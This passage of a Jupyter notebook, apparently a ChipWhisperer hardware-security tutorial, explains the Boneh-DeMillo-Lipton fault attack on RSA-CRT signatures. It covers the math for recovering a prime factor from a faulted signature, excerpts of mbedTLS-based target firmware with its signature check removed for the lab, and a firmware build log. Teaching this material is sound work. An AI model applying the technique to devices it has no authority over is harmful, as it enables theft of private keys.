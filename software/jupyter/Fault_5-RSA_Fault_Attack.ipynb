{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# RSA FaultAttack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This advanced tutorial will demonstrate an attack on RSA signatures that use the Chinese Remainder Theorem as an optimization. This tutorial will make use of glitching, so it's recommended that you complete at least Fault_1-Introduction_to_Clock_Glitch_Attacks before attempting this tutorial. You may also want to install gmpy2 before running this tutorial, as it makes a later section of the tutorial much faster. Linux users can install this via their package manager, Mac users via Brew, and Windows users via the [Unofficial Windows Python Binaries](https://www.lfd.uci.edu/~gohlke/pythonlibs/).\n",
    "\n",
    "Additionally, this tutorial has been designed for Arm targets only. Users of other hardware will likely need to make changes to available RSA libraries to complete this tutorial.\n",
    "\n",
    "This attack is was originally detailed in a [1997 paper by Boneh, Demillo, and Lipton](https://www.researchgate.net/publication/2409434_On_the_Importance_of_Checking_Computations). This tutorial draws heavily from a blog post by David Wong, which you can find [here](https://www.cryptologie.net/article/371/fault-attacks-on-rsas-signatures/)."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "#Parameters\n",
    "SCOPETYPE = 'OPENADC'\n",
    "PLATFORM = 'CWLITEARM'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack Theory"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We won't cover much about what RSA (there's a [Wikipedia article](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) for that), but we will give a quick summary.\n",
    "\n",
    "* RSA is a public key crypto system. It can be used in a few different ways, but we'll be using it for signing messages in this case. In this mode, User A can sign a message using their private information. User B can then verify that User A was the one who signed the message using publically available information.\n",
    "* This means that some information is public, while other information is private.\n",
    "* Public information includes the public modulus n, and the public exponent e\n",
    "* Private information includes the private exponent d, as well as p and q, which are prime factors of n\n",
    "* The public information can be freely shared, but learning any private information compromises the whole system\n",
    "\n",
    "The math of RSA (once you have all the key parts generated) is actually pretty simple. To sign the message, the following equation can be applied (with signature s, message m, private exponent d, and public modulus n):\n",
    "\n",
    "$$s = m^d({mod}\\ n)$$\n",
    "\n",
    "To verify a signature, the following equation is used (with signature s, public exponent e, message m, and public modulus n):\n",
    "\n",
    "$$s^e = m(mod\\ n)$$\n",
    "\n",
    "Despite the simplicity of these equations, signing messages in particular is a very slow operation, with the implementation from MBEDTLS, a popular crypto library for Arm devices, taking over 12M cycles for RSA-1024 (and this is with the optimization we make in the next section). This is because all of the numbers used in these equations are huge (n and d are 1024 bits long in this case). As you can imagine, any improvement we can make to the speed of this operation is very important. It turns out there is a large speed optimization that we can make."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Chinese Remainder Theorem (CRT)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Instead of computing $s = m^d(mod\\ n)$, we can instead break n into two primes, p and q, such that $n = pq$, then use those to calculate the signature instead of n. As you might have guessed, p and q are the same private information we talked about earlier. Bascially, if we learn either, we'll be able to derive the rest of the private information fairly easily. We won't go into all the math, but here's the important operations:\n",
    "\n",
    "* Derive $d_p$ from d and p and $d_q$ from d and q\n",
    "* Calculate: $s_1 = m^{d_p}(mod\\ p)$ and $s_2 = m^{d_q}(mod\\ q)$\n",
    "* Combine $s_1$ and $s_2$ into $s$ via CRT\n",
    "\n",
    "Since p and q are much smaller than n, creating signatures is much much faster this way. As such, many popular RSA implementations (including MBEDTLS) use CRT to speed up RSA."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### CRT Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Suppose that instead of everything going smoothly as above, a fault happens during the calculation of $s_1$ or $s_2$ (we'll assume that the fault was with $s_2$ here, which will become $s^{'}_{2}$). If that happens, the following becomes true (with faulty signatures $s_2'$, which generates $s'$):\n",
    "\n",
    "$$s'^e = m(mod\\ p) \\Rightarrow s'^e - m = 0 (mod\\ p)$$\n",
    "$$s'^e \\neq m(mod\\ q) \\Rightarrow s'^e - m \\neq 0 (mod\\ q)$$\n",
    "\n",
    "The result of this is that p will be a factor of $s'^e - m$, but q and n will not be. Since p is also a factor of N, what follows is that:\n",
    "\n",
    "$$p = gcd(s'^e - m, N)$$\n",
    "\n",
    "Thus, if we introduce a fault in the calculation of either $s_1$ or $s_2$, we'll be able to get either q or p, and from there the rest of the private values!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, let's take a look at the RSA implementation we're attacking. For this attack, we'll be using the `simpleserial-rsa-arm` project folder. There's a few files here, but the important one is `simpleserial-arm-rsa.c`. Open it. As you scroll through, you'll find all our public/private values. Next, navigate to `real_dec()`:\n",
    "\n",
    "```C\n",
    "uint8_t buf[128];\n",
    "uint8_t hash[32];\n",
    "uint8_t real_dec(uint8_t *pt)\n",
    "{\n",
    "     int ret = 0;\n",
    "\n",
    "     //first need to hash our message\n",
    "     memset(buf, 0, 128);\n",
    "     mbedtls_sha256(MESSAGE, 12, hash, 0);\n",
    "\n",
    "     trigger_high();\n",
    "     ret = simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign(&rsa_ctx, NULL, NULL, MBEDTLS_RSA_PRIVATE, MBEDTLS_MD_SHA256, 32, hash, buf);\n",
    "     trigger_low();\n",
    "\n",
    "     //send back first 48 bytes\n",
    "     simpleserial_put('r', 48, buf);\n",
    "     return ret;\n",
    "}\n",
    "```\n",
    "\n",
    "You'll notice that we first hash our message (`\"Hello World!\"`) using SHA256. Once this is passed to the signature function, it will be padded according to the PKCS#1 v1.5 standard. This isn't too important now, but it will be important later. Next we sign our message using `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()`, then send back the first 48 bytes of it. We'll be sending the signature back in multiple chunks to avoid overflowing the CWLite's buffer of 128 bytes via `sig_chunk_1()` and `sig_chunk_2()` directly below this function.\n",
    "\n",
    "We'll actually skip over `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()` here, since most of the important stuff actually happens in a different function. You should note, however, that this function has been modified to remove a signature check, which would need to be bypassed in a real attack.\n",
    "\n",
    "Next, find the function `simpleserial_mbedtls_rsa_private()`, a cleaned up version of `mbedtls_rsa_private()`, where the signature calculation actually happens:\n",
    "```C\n",
    "/*\n",
    " * Do an RSA private key operation\n",
    " */\n",
    "static int simpleserial_mbedtls_rsa_private( mbedtls_rsa_context *ctx,\n",
    "                 int (*f_rng)(void *, unsigned char *, size_t),\n",
    "                 void *p_rng,\n",
    "                 const unsigned char *input,\n",
    "                 unsigned char *output )\n",
    "\n",
    "```\n",
    "\n",
    "scrolling down a bit, we do indeed find that this function uses CRT to speed up the calculation:\n",
    "\n",
    "```C\n",
    "    /*\n",
    "     * Faster decryption using the CRT\n",
    "     *\n",
    "     * T1 = input ^ dP mod P\n",
    "     * T2 = input ^ dQ mod Q\n",
    "     */\n",
    "    MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T1, &T, DP, &ctx->P, &ctx->RP ) );\n",
    "    MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T2, &T, DQ, &ctx->Q, &ctx->RQ ) );\n",
    "```\n",
    "\n",
    "You can view more of the firmware if you want, but for now let's build our firmware and then move over to our python script:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "CRYPTO_TARGET=\"MBEDTLS\"\n",
    "CRYPTO_OPTIONS=\"RSA\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "rm -f -- simpleserial-rsa-CWLITEARM.hex\r\n",
      "rm -f -- simpleserial-rsa-CWLITEARM.eep\r\n",
      "rm -f -- simpleserial-rsa-CWLITEARM.cof\r\n",
      "rm -f -- simpleserial-rsa-CWLITEARM.elf\r\n",
      "rm -f -- simpleserial-rsa-CWLITEARM.map\r\n",
      "rm -f -- simpleserial-rsa-CWLITEARM.sym\r\n",
      "rm -f -- simpleserial-rsa-CWLITEARM.lss\r\n",
      "rm -f -- objdir/*.o\r\n",
      "rm -f -- objdir/*.lst\r\n",
      "rm -f -- simpleserial-rsa.s simpleserial-rsa-xmega.s simpleserial-rsa-arm.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s rsa.s bignum.s md.s md5.s md_wrap.s sha1.s sha256.s sha512.s ripemd160.s oid.s\r\n",
      "rm -f -- simpleserial-rsa.d simpleserial-rsa-xmega.d simpleserial-rsa-arm.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d rsa.d bignum.d md.d md5.d md_wrap.d sha1.d sha256.d sha512.d ripemd160.d oid.d\r\n",
      "rm -f -- simpleserial-rsa.i simpleserial-rsa-xmega.i simpleserial-rsa-arm.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i rsa.i bignum.i md.i md5.i md_wrap.i sha1.i sha256.i sha512.i ripemd160.i oid.i\r\n",
      ".\r\n",
      "-------- begin --------\r\n",
      "arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]\r\n",
      "Copyright (C) 2017 Free Software Foundation, Inc.\r\n",
      "This is free software; see the source for copying conditions.  There is NO\r\n",
      "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\n",
      "\r\n",
      ".\r\n",
      "Compiling C: simpleserial-rsa.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa.o.d simpleserial-rsa.c -o objdir/simpleserial-rsa.o \r\n",
      ".\r\n",
      "Compiling C: simpleserial-rsa-xmega.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa-xmega.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa-xmega.o.d simpleserial-rsa-xmega.c -o objdir/simpleserial-rsa-xmega.o \r\n",
      ".\r\n",
      "Compiling C: simpleserial-rsa-arm.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa-arm.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa-arm.o.d simpleserial-rsa-arm.c -o objdir/simpleserial-rsa-arm.o \r\n",
      ".\r\n",
      "Compiling C: .././simpleserial/simpleserial.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o \r\n",
      ".\r\n",
      "Compiling C: .././hal/stm32f3/stm32f3_hal.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o \r\n",
      ".\r\n",
      "Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o \r\n",
      ".\r\n",
      "Compiling C: .././hal/stm32f3/stm32f3_sysmem.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/rsa.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/rsa.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/rsa.o.d .././crypto/mbedtls//library/rsa.c -o objdir/rsa.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/bignum.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/bignum.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/bignum.o.d .././crypto/mbedtls//library/bignum.c -o objdir/bignum.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/md.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/md.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/md.o.d .././crypto/mbedtls//library/md.c -o objdir/md.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/md5.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/md5.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/md5.o.d .././crypto/mbedtls//library/md5.c -o objdir/md5.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/md_wrap.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/md_wrap.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/md_wrap.o.d .././crypto/mbedtls//library/md_wrap.c -o objdir/md_wrap.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/sha1.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/sha1.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/sha1.o.d .././crypto/mbedtls//library/sha1.c -o objdir/sha1.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/sha256.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/sha256.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/sha256.o.d .././crypto/mbedtls//library/sha256.c -o objdir/sha256.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/sha512.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/sha512.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/sha512.o.d .././crypto/mbedtls//library/sha512.c -o objdir/sha512.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/ripemd160.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/ripemd160.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/ripemd160.o.d .././crypto/mbedtls//library/ripemd160.c -o objdir/ripemd160.o \r\n",
      ".\r\n",
      "Compiling C: .././crypto/mbedtls//library/oid.c\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/oid.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/oid.o.d .././crypto/mbedtls//library/oid.c -o objdir/oid.o \r\n",
      ".\r\n",
      "Assembling: .././hal/stm32f3/stm32f3_startup.S\r\n",
      "arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o\r\n",
      ".\r\n",
      "Linking: simpleserial-rsa-CWLITEARM.elf\r\n",
      "arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_1 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DMBEDTLS -DMBEDTLS_SHA -DF_CPU=7372800UL -O2 -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-rsa.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -I.././crypto/mbedtls//include -std=gnu99 -MMD -MP -MF .dep/simpleserial-rsa-CWLITEARM.elf.d objdir/simpleserial-rsa.o objdir/simpleserial-rsa-xmega.o objdir/simpleserial-rsa-arm.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/rsa.o objdir/bignum.o objdir/md.o objdir/md5.o objdir/md_wrap.o objdir/sha1.o objdir/sha256.o objdir/sha512.o objdir/ripemd160.o objdir/oid.o objdir/stm32f3_startup.o --output simpleserial-rsa-CWLITEARM.elf --specs=nano.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=simpleserial-rsa-CWLITEARM.map,--cref   -lm  \r\n",
      ".\r\n",
